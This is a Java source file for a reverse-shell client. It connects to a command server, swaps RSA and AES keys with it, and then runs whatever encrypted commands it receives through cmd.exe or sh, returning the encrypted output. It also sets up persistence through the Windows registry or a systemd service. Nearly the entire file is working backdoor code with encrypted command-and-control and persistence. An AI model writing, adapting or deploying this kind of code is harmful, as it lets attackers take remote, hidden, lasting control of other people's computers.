package obs1d1anc1ph3r.reverseshell;

import java.io.*;
import java.net.*;
import java.security.PublicKey;
import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;

public class ReverseShellClient {

    private static final String SERVER_IP = "localhost";
    private static final int SERVER_PORT = 2222;

    private Socket socket;
    private BufferedReader in;
    private PrintWriter out;
    private PublicKey serverPublicKey;

    public static void main(String[] args) throws Exception {
        // Ensure AES Key and IV are initialized
        if (Constants.AES_SECRET_KEY == null || Constants.IV == null) {
            System.err.println("Failed to initialize AES key or IV.");
            return;
        }

        // Log the initialized AES key and IV
        System.out.println("AES Key (Base64): " + CryptoUtils.secretKeyToBase64(Constants.AES_SECRET_KEY));
        System.out.println("IV (Base64): " + CryptoUtils.ivToBase64(Constants.IV));

        ReverseShellClient client = new ReverseShellClient();
        client.start();
    }

    public void start() throws Exception {
        try {
            connectToServer();
            setupPersistence();
            handleCommands();
        } catch (IOException e) {
            System.err.println("Connection error: " + e.getMessage());
        } finally {
            cleanup();
        }
    }

    private void connectToServer() throws IOException, Exception {
        System.out.println("[*] Connecting to server...");
        socket = new Socket(SERVER_IP, SERVER_PORT);
        System.out.println("[+] Connected to server: " + SERVER_IP + ":" + SERVER_PORT);

        in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
        out = new PrintWriter(socket.getOutputStream(), true);

        String serverPublicKeyBase64 = in.readLine();
        serverPublicKey = CryptoUtils.getPublicKeyFromBase64(serverPublicKeyBase64);
        sendAESKey();
    }

    private void sendAESKey() throws Exception {
        String aesKeyBase64 = CryptoUtils.secretKeyToBase64(Constants.AES_SECRET_KEY);
        String encryptedAESKey = CryptoUtils.encryptRSA(aesKeyBase64, serverPublicKey);
        out.println(encryptedAESKey);
        out.println(CryptoUtils.ivToBase64(Constants.IV)); // Send IV to server
        System.out.println("[*] AES key and IV sent to server.");
    }

    private void handleCommands() throws IOException {
        String encryptedCommand;
        while ((encryptedCommand = in.readLine()) != null) {
            String command = decryptCommand(encryptedCommand);

            if (command.equalsIgnoreCase("exit")) {
                System.out.println("[-] Server disconnected.");
                break;
            }

            // Log the decrypted command
            System.out.println("Decrypted Command: " + command);

            String result = executeCommand(command);
            sendResponse(result);
        }
    }

    private String executeCommand(String command) {
        StringBuilder output = new StringBuilder();

        try {
            ProcessBuilder processBuilder = new ProcessBuilder();
            processBuilder.command(getShell(), getShellFlag(), command);
            processBuilder.redirectErrorStream(true);

            Process process = processBuilder.start();

            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                }
            }
        } catch (IOException e) {
            return "Error executing command: " + e.getMessage();
        }

        return output.toString().trim();
    }

    private String getShell() {
        return isWindows() ? "cmd.exe" : "sh";
    }

    private String getShellFlag() {
        return isWindows() ? "/c" : "-c";
    }

    private boolean isWindows() {
        return System.getProperty("os.name").toLowerCase().contains("win");
    }

    private String decryptCommand(String encryptedCommand) {
        try {
            String decryptedCommand = CryptoUtils.decryptAES(encryptedCommand, Constants.AES_SECRET_KEY, Constants.IV);
            System.out.println("Decrypted Command: " + decryptedCommand);
            return decryptedCommand;
        } catch (Exception e) {
            System.err.println("Error decrypting command: " + e.getMessage());
            return "";
        }
    }

    private void sendResponse(String response) {
        try {
            String encryptedResponse = CryptoUtils.encryptAES(response, Constants.AES_SECRET_KEY, Constants.IV);
            System.out.println("Raw Response before Encryption: " + response);
            System.out.println("Encrypted Response (Base64): " + encryptedResponse);
            out.println(encryptedResponse);
        } catch (Exception e) {
            System.err.println("Error encrypting response: " + e.getMessage());
        }
    }

    public void setupPersistence() {
        if (isWindows()) {
            Persistence.addToRegistry();
        } else {
            Persistence.addSystemdService();
        }
    }

    private void cleanup() {
        try {
            if (in != null) {
                in.close();
            }
            if (out != null) {
                out.close();
            }
            if (socket != null) {
                socket.close();
            }
        } catch (IOException e) {
            System.err.println("Error closing resources: " + e.getMessage());
        }
    }
}